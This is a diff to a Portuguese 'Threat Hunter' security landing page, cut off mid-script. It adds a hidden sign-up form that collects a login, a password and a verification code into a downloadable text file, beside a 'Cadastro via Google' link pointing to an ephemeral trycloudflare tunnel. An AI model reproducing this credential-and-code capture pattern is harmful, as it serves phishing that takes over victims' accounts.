@@ -2,84 +2,102 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Threat Hunter - Segurança Defensiva</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+    <title>THREAT HUNTER - Segurança Defensiva</title>
     <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
         body {
-            font-family: 'Inter', sans-serif;
-            background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
-            color: #fff;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 40px 20px;
-            min-height: 100vh;
-        }
-        .logo {
-            max-width: 240px;
-            margin-bottom: 30px;
-        }
-        h1 {
-            font-size: 2em;
-            margin-bottom: 10px;
-            color: #00d4ff;
-        }
-        p {
-            font-size: 1.1em;
-            margin-bottom: 30px;
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
             text-align: center;
-            max-width: 600px;
+            padding: 40px;
         }
-        .links {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 16px;
+        img {
+            max-width: 300px;
+            height: auto;
+            margin-bottom: 30px;
         }
-        .link-btn {
-            padding: 14px 28px;
-            background-color: #00aaff;
-            color: white;
-            border: none;
-            border-radius: 10px;
-            font-size: 1em;
-            cursor: pointer;
+        .link-container {
+            margin: 20px 0;
+        }
+        a, button {
+            display: inline-block;
+            padding: 12px 24px;
+            margin: 10px;
+            font-size: 16px;
             text-decoration: none;
-            transition: background 0.3s ease;
+            color: #fff;
+            background-color: #007bff;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
         }
-        .link-btn:hover {
-            background-color: #007acc;
+        a:hover, button:hover {
+            background-color: #0056b3;
         }
-        footer {
-            margin-top: auto;
-            padding-top: 40px;
-            font-size: 0.9em;
-            color: #ccc;
+
+        /* Estilo do formulário */
+        .form-container {
+            display: none;
+            background-color: #ffffff;
+            border: 1px solid #ccc;
+            padding: 20px;
+            border-radius: 10px;
+            max-width: 400px;
+            margin: 30px auto;
+            text-align: left;
+        }
+        label {
+            display: block;
+            margin: 10px 0 5px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
         }
     </style>
 </head>
 <body>
 
-    <img src="logo.png" alt="Threat Hunter Logo" class="logo">
+    <img src="logo.png" alt="Logo" style="max-width: 500px;">
+    
+    <p>Clique abaixo para ser redirecionado:</p>
 
-    <h1>Bem-vindo à Threat Hunter</h1>
-    <p>Monitoramento, prevenção e conscientização em segurança da informação. Clique abaixo para acessar ferramentas úteis:</p>
-
-    <div class="links">
-        <a href="https://preview--key-guardian-app.lovable.app/" target="_blank" class="link-btn">🔐 Cofre de Senhas</a>
-        <a href="https://haveibeenpwned.com/" target="_blank" class="link-btn">💥 Vazamento de Senhas</a>
-        <a href="https://sauce-what-enable-concentration.trycloudflare.com" target="_blank" class="link-btn">🧪 Cadastro via Google</a>
+    <div class="link-container">
+        <a href="https://preview--key-guardian-app.lovable.app/" target="_blank">Cofre de senhas</a>
+        <a href="https://haveibeenpwned.com/" target="_blank">Vazamento de senhas</a>
+        <a href="https://sauce-what-enable-concentration.trycloudflare.com" target="_blank">Cadastro via Google</a>
+        <button onclick="mostrarFormulario()">Cadastrar-se</button>
     </div>
 
-    <footer>
-        &copy; 2025 Threat Hunter. Todos os direitos reservados.
-    </footer>
+    <div class="form-container" id="formulario">
+        <form onsubmit="salvarDados(event)">
+            <label for="login">Login:</label>
+            <input type="text" id="login" name="login" required>
 
-</body>
-</html>
+            <label for="senha">Senha:</label>
+            <input type="password" id="senha" name="senha" required>
+
+            <label for="codigo">Código de Verificação:</label>
+            <input type="text" id="codigo" name="codigo" required>
+
+            <button type="submit">Salvar Cadastro</button>
+        </form>
+    </div>
+
+    <script>
+        function mostrarFormulario() {
+            document.getElementById("formulario").style.display = "block";
+        }
+
+        function salvarDados(event) {
+            event.preventDefault();
+            const login = document.getElementById("login").value;
+            const senha = document.getElementById("senha").value;
+            const codigo = document.getElementById("codigo").value;
+
+            const conteudo = `Login: ${login}\nSenha: ${senha}\nCódigo: ${codigo}`;
+            const blob = new Blob([conteudo], { type: 'text/plain' });
+            const link = document.createElement('a');
+            link.href = URL.createObje
